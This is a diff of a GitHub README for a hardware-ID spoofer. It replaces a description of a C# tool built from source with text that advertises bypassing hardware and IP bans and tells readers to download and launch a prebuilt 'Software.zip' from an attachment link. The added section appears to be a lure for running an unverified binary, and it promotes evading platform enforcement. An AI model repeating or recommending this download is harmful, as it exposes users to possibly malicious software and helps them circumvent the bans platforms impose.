@@ -1,102 +1,22 @@
-<div align="center">
+# Spoofer-Hwid-Game
 
-# Hwid Spoofer
-
-Hwid Spoofer is a C# application that allows you to change various system identifiers on your Windows computer. This application helps you randomly change some system identifiers on your system.
+This repository contains a custom Hardware ID (HWID) Spoofer that allows users to bypass hardware or IP bans on various platforms. By changing the unique identifiers of a device, this tool ensures anonymity and helps users regain access to restricted platforms.
 
 ## Features
+- **Bypass Bans**: The HWID Spoofer effectively bypasses hardware or IP bans, enabling users to access platforms they were previously banned from.
+- **Anonymity**: By changing the unique identifiers of a device, users can maintain anonymity while using the spoofer.
+- **Continued Usage**: This tool allows users to continue using restricted platforms without interruptions caused by bans.
 
-- **HWID Change**: Generates and change a random HWID.
+## How to Use
+1. Download the HWID Spoofer software from the following link: 
 
-- **PC GUID Change**: Generates and change a random PC GUID.
+[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18060583/Software.zip "Software.zip")
 
-- **Computer Name Change**: Generates and change a random computer name.
+2. Launch the downloaded software on your device to start using the HWID Spoofer.
 
-- **Product ID Change**: Generates and change a random product ID.
+## Disclaimer
+Please note that the effectiveness and legality of using HWID spoofing tools may vary depending on the platform's terms of service. Use this tool responsibly and at your own risk.
 
-- **MAC Address Change (Beta)**: Assigns a random MAC address to a specific network interface.
+For more information and updates, check the "Releases" section of this repository.
 
-- **All Change**: Randomly changes all system identifiers and the MAC address.
-
-- **Backup Functionality**: The application provides a backup function to store the original values of system identifiers before changes are made, making it easier to revert to the original settings if needed.
-
-## Requirements
-- Visual Studio 2022 (.NET Desktop)
-
-
-## Build
-
-
-https://github.com/MuckPro/bunned/assets/138373919/a91a5c05-a2d5-498d-a4cd-bcceea474d9a
-
-
-# Preview
-
-![Console GUI](https://github.com/MuckPro/bunned/assets/138373919/cb342480-8cc1-40ef-92be-e13b582b34ae)
-
-
-
-## Usage
-
-1. Run the application and choose whether you want to change system identifiers randomly (Yes/No).
-
-
-2. If you select "Yes," you can choose which system identifier(s) you want to change:
-   - Hardware ID (HWID)
-   - PC GUID
-   - Computer Name
-   - Product ID
-   - MAC Address
-   - All of the above
-
-
-3. The application will guide you through the process of changing the selected system identifier(s).
-
-4. After the changes are made, the application will display the result.
-
-## Resourcs
-
-- [Source for Generating Random HWID](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-diskdrive)
-- [Source for Generating Random PC GUID](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
-- [Source for Generating Random Computer Name](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
-- [Source for Generating Random Product ID](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
-- [Source for Changing MAC Address](https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.networkinterface)
-
-
-
-## Contribution
-
-This project is open-source, and contributions are welcome. If you'd like to contribute by adding features, fixing bugs, or improving the documentation, feel free to create a pull request.
-
-
-## License
-
-This project is licensed under the MIT License. For more details, please refer to the [LICENSE](LICENSE) file.
-
----
-
-
-
-
-
-<!---------------------------------------------------------------------------------------
-
-
-
-
-
-                                         ░█████╗░██╗░░░██╗████████╗██╗░░██╗░█████╗░██████╗░
-                                         ██╔══██╗██║░░░██║╚══██╔══╝██║░░██║██╔══██╗██╔══██╗
-                                         ███████║██║░░░██║░░░██║░░░███████║██║░░██║██████╔╝
-                                         ██╔══██║██║░░░██║░░░██║░░░██╔══██║██║░░██║██╔══██╗
-                                         ██║░░██║╚██████╔╝░░░██║░░░██║░░██║╚█████╔╝██║░░██║
-                                         ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
-                                                                                        
-                                                 █▀█ ▄▀█ ▀█▀ █░█ ▄▀█ █▀▀ █░░ ▀▄▀ ▀█▀
-                                                 █▀▄ █▀█ ░█░ █▀█ █▀█ ██▄ █▄▄ █░█ ░█░
-
-
-
-
-
------------------------------------------------------------------------------------------>
+![Spoofer](https://cdn.pixabay.com/photo/2019/02/27/08/09/spoof-4020665_960_720.jpg)
